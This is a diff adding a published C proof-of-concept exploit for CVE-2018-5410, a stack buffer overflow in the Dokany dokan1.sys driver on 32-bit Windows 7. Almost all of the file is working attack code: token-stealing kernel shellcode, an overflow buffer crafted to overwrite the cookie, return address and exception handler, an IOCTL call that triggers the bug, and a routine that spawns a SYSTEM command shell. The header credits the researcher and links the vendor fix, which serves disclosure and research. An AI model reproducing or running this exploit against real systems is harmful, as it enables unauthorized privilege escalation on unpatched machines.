@@ -1,0 +1,158 @@
+/*
+
+Exploit Title    - Dokany Stack-based Buffer Overflow Privilege Escalation
+Date             - 14th January 2019
+Discovered by    - Parvez Anwar (@parvezghh)
+Vendor Homepage  - http://dokan-dev.github.io
+Tested Version   - 1.2.0.1000
+Driver Version   - 1.2.0.1000 - dokan1.sys
+Software package - https://github.com/dokan-dev/dokany/releases/download/v1.2.0.1000/DokanSetupDbg_redist.exe
+Tested on OS     - 32bit Windows 7
+CVE ID           - CVE-2018-5410
+Vendor fix url   - https://github.com/dokan-dev/dokany/releases/tag/v1.2.1.1000
+CERT/CC Vul note - https://www.kb.cert.org/vuls/id/741315
+Fixed Version    - 1.2.1.1000
+Fixed driver ver - 1.2.1.1000
+
+
+
+Check blogpost for details:
+ 
+https://www.greyhathacker.net/?p=1041
+
+*/
+
+
+#include <stdio.h>
+#include <windows.h>
+
+#define BUFSIZE     896    
+
+
+// Windows 7 SP1
+
+#define W7_KPROCESS 0x50      // Offset to _KPROCESS from a _ETHREAD struct
+#define W7_TOKEN    0xf8      // Offset to TOKEN from the _EPROCESS struct
+#define W7_UPID     0xb4      // Offset to UniqueProcessId FROM the _EPROCESS struct
+#define W7_APLINKS  0xb8      // Offset to ActiveProcessLinks _EPROCESS struct
+
+
+BYTE token_steal_w7[] =
+{
+  0x60,                                                  // pushad                         Saves all registers
+  0x64,0xA1,0x24,0x01,0x00,0x00,                         // mov eax, fs:[eax+124h]         Retrieve ETHREAD
+  0x8b,0x40,W7_KPROCESS,                                 // mov eax, [eax+W7_KPROCESS]     Retrieve _KPROCESS
+  0x8b,0xc8,                                             // mov ecx, eax                   Current _EPROCESS structure
+  0x8b,0x98,W7_TOKEN,0x00,0x00,0x00,                     // mov ebx, [eax+W7_TOKEN]        Retrieves TOKEN
+  0x8b,0x80,W7_APLINKS,0x00,0x00,0x00,                   // mov eax, [eax+W7_APLINKS] <-|  Retrieve FLINK from ActiveProcessLinks
+  0x81,0xe8,W7_APLINKS,0x00,0x00,0x00,                   // sub eax, W7_APLINKS         |  Retrieve _EPROCESS Pointer from the ActiveProcessLinks
+  0x81,0xb8,W7_UPID,0x00,0x00,0x00,0x04,0x00,0x00,0x00,  // cmp [eax+W7_UPID], 4        |  Compares UniqueProcessId with 4 (System Process)
+  0x75,0xe8,                                             // jne                     ---- 
+  0x8b,0x90,W7_TOKEN,0x00,0x00,0x00,                     // mov edx, [eax+W7_TOKEN]        Retrieves TOKEN and stores on EDX
+  0x89,0x91,0xF8,0x00,0x00,0x00,                         // mov [ecx+W7_TOKEN], edx        Overwrites the TOKEN for the current KPROCESS
+  0x61,                                                  // popad                          Restores all registers
+  0x81,0xc4,0x3c,0x0b,0x00,0x00,                         // add esp,0xB3c                  Target frame to return
+  0x31,0xc0,                                             // xor eax,eax                    NTSTATUS -> STATUS_SUCCESS
+  0x5d,                                                  // pop ebp                        Restore saved EBP
+  0xc2,0x08,0x00                                         // ret 8                          Return cleanly
+};
+
+
+
+int spawnShell()
+{
+    STARTUPINFOA         si;
+    PROCESS_INFORMATION  pi;
+
+
+    ZeroMemory(&pi, sizeof(pi));
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+
+    if (!CreateProcess(NULL, "C:\\Windows\\System32\\cmd.exe", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
+    {
+        printf("\n[-] CreateProcess failed (%d)\n\n", GetLastError());
+        return -1;
+    }
+
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+
+    return 0;
+}
+
+
+
+int main(int argc, char *argv[]) 
+{
+    HANDLE         hDevice;
+    char           devhandle[MAX_PATH];
+    DWORD          dwRetBytes = 0;   
+    BYTE           *inbuffer;
+    LPVOID         addrtoshell;
+
+
+    printf("-------------------------------------------------------------------------------\n");
+    printf("   Dokany (dokan1.sys) Stack-based Buffer Overflow Cookie Bypass EoP Exploit   \n");
+    printf("                          Tested on 32bit Windows 7                            \n");
+    printf("-------------------------------------------------------------------------------\n");
+
+    addrtoshell = VirtualAlloc(NULL, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    if(addrtoshell == NULL)
+    {
+        printf("\n[-] VirtualAlloc allocation failure %.8x\n\n", GetLastError());
+        return -1;
+    }
+
+    memcpy(addrtoshell, token_steal_w7, sizeof(token_steal_w7));
+
+    printf("\n[i] Size of shellcode %d bytes", sizeof(token_steal_w7));
+    printf("\n[i] Shellcode located at address 0x%p", addrtoshell);
+
+    inbuffer = VirtualAlloc(NULL, BUFSIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+   
+    if(inbuffer == NULL)
+    {
+        printf("\n[-] VirtualAlloc allocation failure %.8x\n\n", GetLastError());
+        return -1;
+    }
+
+    memset(inbuffer, 0x41, BUFSIZE); 
+    printf("\n[i] Buffer located at address 0x%p", inbuffer);
+
+    printf("\n[i] Size of total input buffer being sent %d bytes", BUFSIZE);
+  
+    *(WORD*)(inbuffer) = BUFSIZE;                       // Size of buffer used by memcpy 
+    *(WORD*)(inbuffer + 2) = BUFSIZE-6;                 // Size of input buffer, value has to be at most BUFSIZE - 6
+    *(DWORD*)(inbuffer + 776) = 0x42424242;             // cookie
+    *(DWORD*)(inbuffer + 784) = 0x43434343;             // return
+    *(DWORD*)(inbuffer + 792) = 0x44444444;             // IRP
+//  *(DWORD*)(inbuffer + 892) = 0x45454545;             // Exception handler
+    *(DWORD*)(inbuffer + 892) = (ULONG)addrtoshell;     // Shellcode
+
+    sprintf(devhandle, "\\\\.\\%s", "Dokan_1");
+
+    hDevice = CreateFile(devhandle, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING , 0, NULL);
+    
+    if(hDevice == INVALID_HANDLE_VALUE)
+    {
+        printf("\n[-] Open %s device failed\n\n", devhandle);
+        return -1;
+    }
+    else 
+    {
+        printf("\n[+] Open %s device successful", devhandle);
+    }	
+
+    printf("\n[~] Press any key to continue . . .\n");
+    getch();
+
+    DeviceIoControl(hDevice, 0x00222010, inbuffer, BUFSIZE, NULL, 0, &dwRetBytes, NULL); 
+
+    printf("[*] Spawning SYSTEM Shell\n");
+    spawnShell();
+
+    CloseHandle(hDevice);
+    return 0;
+}
